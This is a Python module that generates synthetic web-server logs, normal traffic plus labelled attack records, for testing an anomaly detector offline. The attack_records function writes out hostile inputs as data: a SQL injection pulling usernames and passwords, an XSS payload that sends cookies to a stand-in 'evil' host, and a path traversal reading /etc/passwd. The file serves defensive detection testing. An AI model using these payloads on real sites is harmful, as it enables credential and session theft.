"""Synthetic log generator: realistic normal traffic plus labelled attacks.

Lets the detector fit on a baseline and be evaluated end-to-end offline, with no
real logs. Records are already in the normalized shape the Rust layer emits.
"""

from __future__ import annotations

import random

_NORMAL_PATHS = [
    "/", "/index.html", "/api/products", "/api/products/42", "/static/app.js",
    "/static/style.css", "/api/cart", "/api/user/profile", "/images/logo.png",
    "/search?q=shoes", "/api/orders", "/favicon.ico",
]
_METHODS = ["GET", "GET", "GET", "POST"]
_STATUS = [200, 200, 200, 200, 301, 304, 404]


def normal_record(rng: random.Random) -> dict:
    path = rng.choice(_NORMAL_PATHS)
    method = rng.choice(_METHODS)
    status = rng.choice(_STATUS)
    nbytes = max(64, int(rng.gauss(2200, 900)))
    ip = f"10.0.{rng.randint(0, 4)}.{rng.randint(2, 250)}"
    return {"ip": ip, "ts": "10/Oct/2026:13:55:36", "method": method,
            "path": path, "status": status, "bytes": nbytes}


def attack_records() -> list[dict]:
    """One representative record per attack class, each clearly anomalous."""
    return [
        {"ip": "45.13.9.7", "method": "GET", "status": 200, "bytes": 320,
         "path": "/api/products?id=1' UNION SELECT username,password FROM users--", "kind": "sqli"},
        {"ip": "45.13.9.7", "method": "GET", "status": 200, "bytes": 300,
         "path": "/search?q=<script>document.location='http://evil'+document.cookie</script>", "kind": "xss"},
        {"ip": "203.0.113.5", "method": "GET", "status": 200, "bytes": 210,
         "path": "/download?file=../../../../etc/passwd", "kind": "path_traversal"},
        {"ip": "198.51.100.22", "method": "POST", "status": 401, "bytes": 90,
         "path": "/login", "kind": "brute_force"},
        {"ip": "198.51.100.99", "method": "GET", "status": 404, "bytes": 120,
         "path": "/wp-admin/setup-config.php", "kind": "recon_scan"},
        {"ip": "185.220.101.4", "method": "GET", "status": 200, "bytes": 9_800_000,
         "path": "/api/export/all", "kind": "data_exfil"},
    ]


def baseline(n: int = 800, seed: int = 1) -> list[dict]:
    rng = random.Random(seed)
    return [normal_record(rng) for _ in range(n)]


def mixed_stream(n_normal: int = 200, seed: int = 2) -> list[dict]:
    """Normal traffic with the attack records interleaved (shuffled)."""
    rng = random.Random(seed)
    records = [normal_record(rng) for _ in range(n_normal)]
    records.extend(attack_records())
    rng.shuffle(records)
    return records
